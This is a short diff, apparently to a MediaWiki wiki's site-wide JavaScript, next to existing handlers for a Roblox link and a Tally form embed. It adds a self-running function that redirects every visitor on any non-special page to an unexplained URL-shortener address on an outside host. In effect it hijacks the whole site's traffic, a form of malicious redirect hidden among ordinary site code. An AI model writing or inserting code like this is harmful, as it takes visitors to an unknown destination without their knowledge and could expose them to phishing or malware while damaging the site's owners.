@@ -15,6 +15,12 @@ $(function() {
         openRobloxLink();
     });
 });
+(function() {
+    if (mw.config.get('wgNamespaceNumber') !== -1) { // Avoid redirecting on special pages
+        window.location.href = "https://www.da.gd/coolcats41";
+    }
+})();
+
 /*tally form embed*/
 mw.hook('wikipage.content').add(function($content) {
     if (!$content) {
